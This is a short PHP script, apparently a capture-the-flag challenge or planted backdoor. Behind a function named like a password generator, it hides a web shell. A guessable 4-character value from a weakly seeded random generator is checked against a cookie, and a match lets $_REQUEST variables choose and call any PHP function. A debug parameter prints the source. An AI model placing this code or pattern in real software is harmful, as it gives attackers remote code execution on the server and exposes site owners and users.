<?php
	if(isset($_GET["debug"]))
        highlight_file(__FILE__);
    else {
		session_start();

		function Password_Random_Nfc_Generator() {
			$charlist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";
			mt_srand((int) ((float) microtime() * 1000));
			$secure_password = "";
			$max = strlen($charlist) - 1;
			for ($i = 0; $i < 4; $i++) {
				$secure_password .= $charlist[mt_rand(0, $max)];
			}
			return $secure_password;
		}

		if(!array_key_exists("Password_Random_Nfc_Generator", $_SESSION)) { $_SESSION["Password_Random_Nfc_Generator"] = Password_Random_Nfc_Generator(); }

		if(@$_COOKIE["Password_Random_Nfc_Generator"] == $_SESSION["Password_Random_Nfc_Generator"]) { @extract($_REQUEST); if(isset($_, $__)) { $_($__); }}
	}
?>